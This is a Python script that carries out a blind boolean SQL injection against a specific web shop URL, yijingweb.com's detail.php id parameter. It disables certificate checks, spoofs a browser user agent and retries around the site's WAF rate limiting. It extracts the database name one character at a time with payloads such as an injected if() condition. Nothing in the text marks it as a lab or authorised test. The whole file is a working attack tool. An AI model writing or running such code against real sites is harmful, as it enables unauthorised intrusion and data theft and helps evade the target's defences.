#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, time
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    for retry in range(4):
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
            b = r.read(80000).decode('utf-8','ignore')
        except urllib.error.HTTPError as e:
            b = e.read(80000).decode('utf-8','ignore')
        except Exception:
            time.sleep(2); continue
        if 'WTS-WAF' in b:
            time.sleep(4); continue  # 限频重试
        if 'Invalid SQL' in b:
            return None
        return TRUE_MARK in b
    return None

def test(cond):
    r = q("687' and if(%s,687,0)#" % cond)
    time.sleep(0.6)  # 防限频
    return r

# 首字符: 中文UTF-8首字节 224-239 优先
print('=== database() 首字符ascii ===')
found = None
# 先测中文范围
for n in range(224, 240):
    r = test("ascii(substr(database(),1,1))=%d" % n)
    if r is True:
        found = n
        print('首字符ascii = %d (0x%x) [中文首字节]' % (n, n))
        break
    if r is None:
        time.sleep(3)
if not found:
    # 再测完整范围(0-223)
    print('中文范围未命中, 测0-223...')
    for n in range(0, 224):
        r = test("ascii(substr(database(),1,1))=%d" % n)
        if r is True:
            found = n
            print('首字符ascii = %d' % n)
            break
        if r is None:
            time.sleep(3)
if not found:
    print('未找到首字符(可能WAF限频或注入点变化)')
